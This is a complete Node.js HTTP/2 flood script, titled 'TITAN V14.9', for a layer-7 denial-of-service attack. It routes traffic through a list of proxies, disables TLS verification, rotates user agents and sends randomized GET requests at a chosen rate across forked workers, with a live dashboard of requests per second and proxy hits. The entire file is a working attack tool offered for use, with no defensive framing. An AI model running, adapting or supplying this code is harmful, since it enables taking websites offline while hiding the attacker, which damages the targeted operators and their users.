const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");
const dns = require("dns");

// Configurações de ataque
const ATTACK_CONFIG = {
    MAX_RETRIES: 5,
    CONNECTION_TIMEOUT: 5000,
    RESPONSE_TIMEOUT: 50000,
    INITIAL_WINDOW_SIZE: 1073741824,
    MAX_CONCURRENT_STREAMS: 5000,
    USER_AGENT_LIST: [
        // DESKTOP BROWSERS
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0 Safari/537.36",

        // MOBILE BROWSERS
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

        // BOTs & CRAWLERS
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
        "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
        "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
        "Twitterbot/1.0",

        // DIVERSOS
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
        "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",

        // +150 MAIS UA VARIADAS
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/120.0.0.0 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux arm64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; U; Android 11; en-us; SM-G991B Build/RP1A.200720.012) AppleWebKit/537.36",
        "Dalvik/2.1.0 (Linux; U; Android 14)",
        "Mozilla/5.0 (Linux; Android 10; HD1900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/118.0.5993.117 Mobile/15E148 Safari/604.1"
    ]
};

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const args = { 
    target: process.argv[2], 
    time: ~~process.argv[3], 
    rate: ~~process.argv[4], 
    threads: ~~process.argv[5],
    proxyFile: process.argv[6] || "proxy.txt"
};

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(l => l.length > 5);
const userAgents = fs.readFileSync("ua.txt", "utf-8").split(/\r?\n/).filter(l => l.length > 10);

function format(n) {
    if (n >= 1e9) return (n / 1e9).toFixed(1) + 'B';
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
    return n;
}

if (cluster.isMaster) {
    let totalSent = 0, rps = 0, targetIp = "Buscando...";
    const codes = {}, online = new Set(), proxyHits = {};

    dns.lookup(parsedTarget.hostname, (err, addr) => { if (!err) targetIp = addr; });

    for (let i = 0; i < args.threads; i++) cluster.fork();

    setInterval(() => {
        console.clear();
        console.log(`\n\x1b[1;37m  \x1b[41m NFU \x1b[0m \x1b[1;31mTITAN V14.9 \x1b[1;30m| \x1b[1;37m[PURE POWER + TRACKER]\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        
        process.stdout.write(`\x1b[1;37m  SENT: \x1b[1;31m${format(totalSent).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  RPS: \x1b[1;32m${format(rps).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  TARGET: \x1b[1;36m${targetIp}\x1b[0m\n`);
        
        let st = Object.entries(codes).sort((a,b) => b[1]-a[1]).map(([c,v]) => {
            let color = c.startsWith('2') ? '\x1b[1;32m' : '\x1b[1;31m';
            return `${color}${c}\x1b[1;37m:${format(v)}`;
        }).join(' \x1b[1;30m| ');
        
        console.log(`\x1b[1;37m  STATUS: ${st || '\x1b[1;30mAguardando...'}\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        
        // TOP 5 PROXIES HITS
        console.log(`\x1b[1;37m  TOP 5 PROXY PERFORMANCE:\x1b[0m`);
        Object.entries(proxyHits).sort((a,b) => b[1]-a[1]).slice(0, 5).forEach(([ip, count]) => {
            console.log(`  \x1b[1;30m> \x1b[1;31m${ip.padEnd(15)}\x1b[1;30m ─ \x1b[1;37mHITS: \x1b[1;32m${format(count)}\x1b[0m`);
        });
        
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[1;37m  PROXIES ONLINE: \x1b[1;33m${online.size}\x1b[0m`);
        
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'batch') {
            totalSent += msg.c; rps += msg.c;
            if (msg.ip) {
                online.add(msg.ip);
                proxyHits[msg.ip] = (proxyHits[msg.ip] || 0) + msg.c;
            }
            Object.keys(msg.codes).forEach(c => { codes[c] = (codes[c] || 0) + msg.codes[c]; });
        }
    });
    
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    for (let i = 0; i < 12; i++) setInterval(runFlooder, 0);
}

function generateRandomHeader() {
    return ATTACK_CONFIG.USER_AGENT_LIST[Math.floor(Math.random() * ATTACK_CONFIG.USER_AGENT_LIST.length)];
}

function runFlooder() {
    const proxyRaw = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyRaw) return;
    const [pHost, pPort] = proxyRaw.split(':');
    
    let attempts = 0;
    const connectToProxy = () => {
        attempts++;
        if (attempts > ATTACK_CONFIG.MAX_RETRIES) return;
        
        const socket = net.createConnection({ host: pHost, port: parseInt(pPort) });
        
        socket.setTimeout(ATTACK_CONFIG.CONNECTION_TIMEOUT);
        
        socket.once("connect", () => {
            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
        });

        socket.once("data", (d) => {
            if (!d.toString().includes("200")) {
                socket.destroy();
                setTimeout(connectToProxy, 2000);
                return;
            }
            
            const tlsConn = tls.connect({
                socket: socket, servername: parsedTarget.host,
                ALPNProtocols: ["h2"], rejectUnauthorized: false
            }, () => {
                const client = http2.connect(parsedTarget.href, {
                    createConnection: () => tlsConn,
                    settings: { 
                        initialWindowSize: ATTACK_CONFIG.INITIAL_WINDOW_SIZE, 
                        maxConcurrentStreams: ATTACK_CONFIG.MAX_CONCURRENT_STREAMS 
                    }
                });

                client.on("connect", () => {
                    let bCount = 0; let bCodes = {};
                    const flood = setInterval(() => {
                        if (!client || client.destroyed) return clearInterval(flood);
                        
                        for (let i = 0; i < args.rate; i++) {
                            const req = client.request({
                            ":method": "GET",
                            ":path": parsedTarget.path + "?" + crypto.randomBytes(3).toString('hex'),
                            ":scheme": "https",
                            ":authority": parsedTarget.host,
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                            "accept": "*/*",
                            "accept-language": "pt-BR,pt;q=0.9",
                            "cache-control": "no-cache"
                            });
                            
                            req.on("response", (res) => {
                                const sc = res[":status"];
                                bCount++; 
                                bCodes[sc] = (bCodes[sc] || 0) + 1;
                                
                                if (bCount >= 100) {
                                    process.send({ type: 'batch', c: bCount, codes: bCodes, ip: pHost });
                                    bCount = 0; bCodes = {};
                                }
                                
                                req.close(); 
                                req.destroy();
                            });
                            
                            req.on('error', () => {
                                req.close();
                                req.destroy();
                            });
                            
                            req.end();
                        }
                    }, 100);
                    
                    setTimeout(() => { 
                        client.destroy(); 
                        socket.destroy(); 
                    }, 15000);
                });
                
                client.on("error", (err) => {
                    socket.destroy();
                });
            });
        });
        
        socket.on("error", (err) => {
            socket.destroy();
            setTimeout(connectToProxy, 1000);
        });
    };
    
    connectToProxy();
}
